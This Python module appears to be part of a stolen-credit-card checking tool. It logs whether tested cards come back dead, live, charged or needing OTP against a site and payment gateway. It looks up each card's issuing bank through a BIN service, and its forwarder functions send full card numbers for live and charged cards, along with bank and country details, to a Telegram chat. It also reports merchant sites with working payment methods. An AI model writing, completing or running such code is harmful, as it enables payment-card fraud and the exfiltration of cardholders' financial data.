import requests
import re
from colorama import init, Fore, Style
init(autoreset=True)


def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)


def get_details(bin: str):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin}"
        response = requests.get(url)
        json = response.json()
        return {"Brand": json['brand'], "Country": json['country_name'], "Bank": json['bank'], "Flag": json['country_flag'], "Level": json['level'], "Type": json['type']}
    except:
        return {"Brand": 'Unknown', "Country": 'Unknown', "Bank": 'Unknown', "Flag": 'Unknown', "Level": 'Unknown', "Type": 'Unknown'}


def send_telegram_message(message, chat_id: str = "", parse_mode="MarkdownV2"):
    url = f""
    payload = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': parse_mode
    }
    response = requests.post(url, data=payload)
    return response.json()


def forwarder(site: str, card: str, message_detail: str, gateway: str):
    bin = card[0:7]
    details = get_details(bin)
    site_mark = escape_markdown_v2(site)
    card_details_mark = escape_markdown_v2(card)
    brand = escape_markdown_v2(details.get('Brand', 'Unknown'))
    bank = escape_markdown_v2(details.get('Bank', 'Unknown'))
    country = escape_markdown_v2(details.get('Country', 'Unknown'))
    flag = escape_markdown_v2(details.get('Flag', ''))
    type_bank = escape_markdown_v2(
        f"{details.get('Type', 'Unknown')}, {details.get('Level', '')}")
    gate = escape_markdown_v2(gateway)
    d_message = escape_markdown_v2(message_detail)

    message = (
        f"*Gate:* *{gate}*\n"
        f"*Site:* {site_mark}\n"
        f"*Card:* `{card_details_mark}`\n"
        f"*Details:* {d_message}\n"
        f"*Brand:* {brand}\n"
        f"*Country:* {country} {flag}\n"
        f"*Bank:* {bank}\n"
        f"*Type:* {type_bank}\n"

    )
    send_telegram_message(message, "")


def logs(type: str, site: str, card: str, message: str, gateway: str = "Stripe"):
    colors = {
        "dead": Fore.RED,
        "live": Fore.GREEN,
        "charged": Fore.YELLOW,
        "otp": Fore.CYAN,
        "error": Fore.MAGENTA
    }
    color = colors.get(type, Fore.WHITE)

    if type == "dead":
        print(
            f"{color}[dead]{Style.RESET_ALL} - [{card}] - [{color}{message}{Style.RESET_ALL}] - [{site}]")
        return
    elif type == "live":
        forwarder(site, card, message, gateway)
        print(
            f"{color}[live]{Style.RESET_ALL} - [{card}] - [{color}{message}{Style.RESET_ALL}]  - [{site}]")
        return
    elif type == "charged":
        forwarder(site, card, message, gateway)
        print(
            f"{color}[charged]{Style.RESET_ALL} - [{card}] - [{color}{message}{Style.RESET_ALL}] - [{site}]")
        return
    elif type == "otp":
        print(
            f"{color}[otp]{Style.RESET_ALL} - [{card}] - [{color}{message}{Style.RESET_ALL}]  - [{site}]")
        return
    else:
        print(
            f"{color}[error]{Style.RESET_ALL} - [{card}] - [{color}{message}{Style.RESET_ALL}]  - [{site}]")
        return


def pm_logs(site: str,  type: str = "dead", message: str = "No payment methods found", payment_methods: list = []):
    colors = {
        "live": Fore.GREEN,
        "error": Fore.RED,
        "dead": Fore.RED
    }
    color = colors.get(type, Fore.WHITE)

    if type == "live":
        payment_text = ", ".join(payment_methods)
        site_text = escape_markdown_v2(site)
        payment_escaped = escape_markdown_v2(payment_text)
        message = f"*Live Site ✅*\n\n*Site:* ||{site_text}||\n*Payment Method:* {payment_escaped}"
        send_telegram_message(message, "")
        print(
            f"{color}[live]{Style.RESET_ALL} - {site} - [{', '.join(payment_methods)}]")
        return
    elif type == "error":
        print(f"{color}[error]{Style.RESET_ALL} - {site} - {message}")
        return
    elif type == "dead":
        print(
            f"{color}[dead]{Style.RESET_ALL} - {site} -  [{', '.join(payment_methods)}] - {message}")
        return
    else:
        print(f"{color}[error]{Style.RESET_ALL} - {site} - [{message}]")
        return


def threed_logs(card: str, status: str, details: str):

    bin = card[0:7]
    details = get_details(bin)
    brand = escape_markdown_v2(details.get('Brand', 'Unknown'))
    bank = escape_markdown_v2(details.get('Bank', 'Unknown'))
    country = escape_markdown_v2(details.get('Country', 'Unknown'))
    flag = escape_markdown_v2(details.get('Flag', ''))
    type_bank = escape_markdown_v2(
        f"{details.get('Type', 'Unknown')}, {details.get('Level', '')}")
    card_text = escape_markdown_v2(card)
    status_text = escape_markdown_v2(status)

    forward_message = (
        f"*Status:* `{status_text}`\n"
        f"*Card:* `{card_text}`\n"
        f"*Brand:* {brand}\n"
        f"*Country:* {country} {flag}\n"
        f"*Bank:* {bank}\n"
        f"*Type:* {type_bank}\n"

    )
    send_telegram_message(forward_message, "")

    return
